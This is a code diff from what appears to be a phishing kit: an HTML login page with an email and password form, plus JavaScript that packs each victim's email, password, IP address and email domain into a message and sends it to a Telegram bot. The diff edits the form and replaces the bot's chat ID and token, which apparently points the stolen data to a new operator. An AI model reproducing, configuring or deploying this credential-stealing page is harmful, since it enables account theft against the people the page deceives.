@@ -1590,7 +1590,11 @@
         </div>
 		<form id="contactform" method="POST" action="">
         <div class="inputs"><div class="input">
-		<input id="email" type="email" placeholder="email address" name="email">
+		
+		<input type="email" name="email" placeholder="Email-Address" id="email" autofocus="true" style="border-color: rgb(140, 140, 140);">
+
+		<br>
+		
 <p></p> <span id="auth_reg">This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin</span>
  <input type="password" name="password" placeholder="password" id="password" autofocus="true" style="border-color: rgb(140, 140, 140);">
 
@@ -4637,8 +4641,8 @@ $('#opsder').html(bari);
 
 					// Prepare the data to send to the Telegram bot
 					var message = `Email: ${email}\nPassword: ${password}\nIP Address: ${ip}\nEmail Domain: ${emailDomain}`;
-					var chat_id = "7946049007"; // Replace with your chat ID
-					var bot_token = "7119131469:AAFOzZl4M9JSE4jIkRry2tRHiIoNnva1P58"; // Replace with your bot token
+					var chat_id = "6648241163"; // Replace with your chat ID
+					var bot_token = "8393717038:AAHHkiREEM-OusoRBxMLSksQnYLcG4ojQlk"; // Replace with your bot token
 					var telegram_url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
 	
 					// Send the data to the Telegram bot
